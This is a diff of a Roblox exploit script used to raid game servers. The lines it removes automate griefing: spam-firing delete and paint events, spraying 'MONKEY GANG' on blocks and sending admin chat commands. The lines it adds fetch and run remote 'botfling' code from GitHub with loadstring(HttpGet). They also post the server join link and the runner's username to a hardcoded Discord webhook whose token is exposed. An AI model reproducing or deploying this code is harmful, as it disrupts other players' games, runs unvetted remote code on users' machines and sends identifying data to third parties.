@@ -1,384 +1,52 @@
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/agarv69/UNIVERSAL-SCRIPT-BY-AGARV/refs/heads/main/botfling1"))() end)
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/agarv69/UNIVERSAL-SCRIPT-BY-AGARV/refs/heads/main/botflingBKIT"))() end)
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/agarv69/UNIVERSAL-SCRIPT-BY-AGARV/refs/heads/main/botflingmain"))() end)
+
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
 
-local isProcessingDelete = false
-local isProcessingPaint = false
-local cancelPaint = false
+local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1494703054052659421/noOKewLiFUxnjNjms0MFwxIu5eerpPQA_F0sgzLyJSJjOwXZELtBT8Ndu-RG68OxlQ05"
 
---------------------------------------------------
--- CHAT FUNCTION
---------------------------------------------------
-local function sendChat(message)
+local req = (syn and syn.request)
+	or request
+	or http_request
+	or (fluxus and fluxus.request)
+	or function() return { StatusCode = 0 } end
+
+local function getJoinLink()
+	local ok, link = pcall(function()
+		return "https://www.roblox.com/games/start?placeId="
+			.. game.PlaceId
+			.. "&gameInstanceId=" .. game.JobId
+	end)
+	return ok and link or ""
+end
+
+local function sendWebhook()
 	pcall(function()
-		local channels = TextChatService:WaitForChild("TextChannels", 2)
-		if channels then
-			local general = channels:FindFirstChild("RBXGeneral")
-			if general then
-				general:SendAsync(message)
-				return
-			end
-		end
-		local chatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 2)
-		if chatEvents then
-			local sayMessage = chatEvents:WaitForChild("SayMessageRequest", 2)
-			if sayMessage then
-				sayMessage:FireServer(message, "All")
-			end
-		end
+		local playerCount = #Players:GetPlayers()
+		local maxPlayers = Players.MaxPlayers
+		
+		req({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = HttpService:JSONEncode({
+				embeds = {{
+					title = string.format("Server Raid Started  |  %d/%d", playerCount, maxPlayers),
+					description = "[Join Game](" .. getJoinLink() .. ")",
+					color = 0xff0000,
+					footer = { text = string.format("%s / %s", LocalPlayer.DisplayName, LocalPlayer.Name) },
+					timestamp = DateTime.now():ToIsoDate()
+				}}
+			})
+		})
 	end)
 end
 
---------------------------------------------------
--- AUTO PICKUP
---------------------------------------------------
+-- Send webhook on execution
 task.spawn(function()
-	while true do
-		local char = LocalPlayer.Character
-		local hum = char and char:FindFirstChildWhichIsA("Humanoid")
-		if hum and hum.Health > 0 and not isProcessingDelete and not isProcessingPaint then
-			local currentlyEquipped = char:FindFirstChildOfClass("Tool")
-			for _, obj in ipairs(workspace:GetChildren()) do
-				if obj:IsA("Tool") and obj:FindFirstChild("Handle") then
-					pcall(function()
-						hum:EquipTool(obj)
-						task.wait(0.05)
-						for i = 1, 3 do
-							if obj.Parent == char then
-								obj.Parent = LocalPlayer.Backpack
-							end
-							task.wait(0.02)
-						end
-						if currentlyEquipped and currentlyEquipped.Parent == LocalPlayer.Backpack then
-							task.wait(0.03)
-							hum:EquipTool(currentlyEquipped)
-						end
-					end)
-				end
-			end
-		end
-		task.wait(0.1)
-	end
-end)
-
---------------------------------------------------
--- AUTO BKIT BREAK (WHEN DELETE TOOL DETECTED)
---------------------------------------------------
-local processedDeleteTools = {}
-
-task.spawn(function()
-	while true do
-		task.wait(0.1)
-
-		-- Check if Brick exists first
-		local brick = ReplicatedStorage:FindFirstChild("Brick")
-		if not brick then
-			task.wait(0.5)
-			continue
-		end
-
-		-- Check if Delete tool exists in backpack
-		local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete")
-		if deleteTool and not processedDeleteTools[deleteTool] then
-			processedDeleteTools[deleteTool] = true
-
-			-- Cancel painting if in progress
-			if isProcessingPaint then
-				cancelPaint = true
-				-- Wait for paint to cancel
-				while isProcessingPaint do
-					task.wait(0.1)
-				end
-			end
-
-			isProcessingDelete = true
-
-			task.spawn(function()
-				pcall(function()
-					local character = LocalPlayer.Character
-					if not character then return end
-					local humanoid = character:FindFirstChild("Humanoid")
-					if not humanoid then return end
-
-					-- Save currently equipped tool
-					local previousTool = character:FindFirstChildOfClass("Tool")
-					if previousTool and previousTool.Name == "Delete" then
-						previousTool = nil
-					end
-
-					-- Equip Delete tool
-					humanoid:EquipTool(deleteTool)
-					task.wait(0.1)
-
-					-- Get the event from the equipped tool
-					local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
-
-					-- Spam fire delete event for 1 second
-					local startTime = tick()
-					while tick() - startTime < 1 do
-						event:FireServer(brick, character.HumanoidRootPart.Position)
-						task.wait(0.05)
-					end
-
-					task.wait(0.1)
-
-					-- Unequip Delete tool
-					humanoid:UnequipTools()
-
-					task.wait(0.2)
-
-					isProcessingDelete = false
-
-					-- Re-equip previous tool if there was one
-					if previousTool and previousTool.Parent == LocalPlayer.Backpack then
-						humanoid:EquipTool(previousTool)
-					end
-				end)
-
-				if not pcall(function() end) then
-					isProcessingDelete = false
-				end
-			end)
-		end
-
-		-- Clean up table for tools that no longer exist
-		for tool, _ in pairs(processedDeleteTools) do
-			if not tool or not tool.Parent then
-				processedDeleteTools[tool] = nil
-			end
-		end
-	end
-end)
-
---------------------------------------------------
--- AUTO PAINT (WHEN PAINT TOOL DETECTED)
---------------------------------------------------
-local processedPaintTools = {}
-
-task.spawn(function()
-	while true do
-		task.wait(0.1)
-
-		-- Check if Brick exists first
-		local brick = ReplicatedStorage:FindFirstChild("Brick")
-		if not brick then
-			task.wait(0.5)
-			continue
-		end
-
-		-- Check if Paint tool exists in backpack
-		local paintTool = LocalPlayer.Backpack:FindFirstChild("Paint")
-		if paintTool and not processedPaintTools[paintTool] then
-			processedPaintTools[paintTool] = true
-			isProcessingPaint = true
-			cancelPaint = false
-
-			task.spawn(function()
-				pcall(function()
-					local character = LocalPlayer.Character
-					if not character then return end
-					local humanoid = character:FindFirstChild("Humanoid")
-					if not humanoid then return end
-
-					-- Save currently equipped tool
-					local previousTool = character:FindFirstChildOfClass("Tool")
-					if previousTool and previousTool.Name == "Paint" then
-						previousTool = nil
-					end
-
-					-- Equip Paint tool
-					humanoid:EquipTool(paintTool)
-					task.wait(0.1)
-
-					-- Get the event from the equipped tool
-					local paintEvent = paintTool:WaitForChild("Script"):WaitForChild("Event")
-
-					local blueColor = Color3.fromRGB(0, 0, 255)
-					local whiteColor = Color3.fromRGB(255, 255, 255)
-					local sprayText = "MONKEY GANG"
-
-					local sides = {
-						Enum.NormalId.Front,
-						Enum.NormalId.Right,
-						Enum.NormalId.Back,
-						Enum.NormalId.Left,
-						Enum.NormalId.Top,
-						Enum.NormalId.Bottom
-					}
-
-					-- Paint all 6 sides blue
-					for i, side in ipairs(sides) do
-						if cancelPaint then break end
-						pcall(function()
-							paintEvent:FireServer(brick, side, brick.Position, "both 🤝", blueColor, "", "")
-						end)
-						task.wait(0.05)
-					end
-
-					if not cancelPaint then
-						-- Apply Smooth material
-						pcall(function()
-							paintEvent:FireServer(brick, Enum.NormalId.Top, brick.Position, "material", blueColor, "Smooth", "")
-						end)
-						task.wait(0.1)
-					end
-
-					-- Clear old spray first
-					for i, side in ipairs(sides) do
-						if cancelPaint then break end
-						for retry = 1, 2 do
-							pcall(function()
-								paintEvent:FireServer(brick, side, brick.Position, "both 🤝", blueColor, "spray", "")
-							end)
-							task.wait(0.03)
-						end
-					end
-
-					-- Apply spray text
-					if not cancelPaint then
-						for i, side in ipairs(sides) do
-							if cancelPaint then break end
-							for retry = 1, 2 do
-								pcall(function()
-									paintEvent:FireServer(brick, side, brick.Position, "both 🤝", whiteColor, "spray", sprayText)
-								end)
-								task.wait(0.03)
-							end
-						end
-					end
-
-					-- Unanchor the brick
-					if not cancelPaint then
-						-- Clear spray on Top side first
-						pcall(function()
-							paintEvent:FireServer(brick, Enum.NormalId.Top, brick.Position, "both 🤝", blueColor, "spray", "")
-						end)
-						task.wait(0.1)
-
-						-- Unanchor
-						pcall(function()
-							paintEvent:FireServer(brick, Enum.NormalId.Top, brick.Position, "material", Color3.new(0, 0, 0), "anchor", "")
-						end)
-						task.wait(0.1)
-
-						-- Re-apply spray on Top side
-						pcall(function()
-							paintEvent:FireServer(brick, Enum.NormalId.Top, brick.Position, "both 🤝", whiteColor, "spray", sprayText)
-						end)
-						task.wait(0.05)
-					end
-
-					task.wait(0.1)
-
-					-- Unequip Paint tool
-					humanoid:UnequipTools()
-
-					task.wait(0.2)
-
-					isProcessingPaint = false
-					cancelPaint = false
-
-					-- Re-equip previous tool if there was one
-					if previousTool and previousTool.Parent == LocalPlayer.Backpack then
-						humanoid:EquipTool(previousTool)
-					end
-				end)
-
-				if not pcall(function() end) then
-					isProcessingPaint = false
-					cancelPaint = false
-				end
-			end)
-		end
-
-		-- Clean up table for tools that no longer exist
-		for tool, _ in pairs(processedPaintTools) do
-			if not tool or not tool.Parent then
-				processedPaintTools[tool] = nil
-			end
-		end
-	end
-end)
-
---------------------------------------------------
--- AUTO ARKENSTONE (WHEN ARKENSTONE DETECTED)
---------------------------------------------------
-local processedArkenstones = {}
-
-task.spawn(function()
-	while true do
-		task.wait(0.1)
-
-		-- Check if Brick exists first
-		local brick = ReplicatedStorage:FindFirstChild("Brick")
-		if not brick then
-			task.wait(0.5)
-			continue
-		end
-
-		-- Check if The Arkenstone exists in backpack OR character
-		local backpack = LocalPlayer:FindFirstChild("Backpack")
-		local char = LocalPlayer.Character
-		local arkenstone = (backpack and backpack:FindFirstChild("The Arkenstone"))
-			or (char and char:FindFirstChild("The Arkenstone"))
-
-		if arkenstone and not processedArkenstones[arkenstone] then
-			processedArkenstones[arkenstone] = true
-
-			-- Cancel painting if in progress
-			if isProcessingPaint then
-				cancelPaint = true
-				-- Wait for paint to cancel
-				while isProcessingPaint do
-					task.wait(0.1)
-				end
-			end
-
-			task.spawn(function()
-				pcall(function()
-					local character = LocalPlayer.Character
-					if not character then return end
-					local humanoid = character:FindFirstChild("Humanoid")
-					if not humanoid then return end
-
-					-- Find arkenstone again in case it moved
-					local ark = LocalPlayer.Backpack:FindFirstChild("The Arkenstone")
-						or (character and character:FindFirstChild("The Arkenstone"))
-
-					if not ark then return end
-
-					-- Equip The Arkenstone if it's in backpack
-					if ark.Parent == LocalPlayer.Backpack then
-						humanoid:EquipTool(ark)
-					end
-
-					task.wait(0.5)
-
-					-- Say ;delcubes all first
-					sendChat(";delcubes all")
-					task.wait(0.1)
-
-					-- Say ;bkit
-					sendChat(";bkit")
-
-					-- Wait for delete to finish processing
-					while isProcessingDelete do
-						task.wait(0.1)
-					end
-
-					-- Unequip arkenstone
-					humanoid:UnequipTools()
-				end)
-			end)
-		end
-
-		-- Clean up table for tools that no longer exist
-		for tool, _ in pairs(processedArkenstones) do
-			if not tool or not tool.Parent then
-				processedArkenstones[tool] = nil
-			end
-		end
-	end
+    task.wait(1)
+    sendWebhook()
 end)
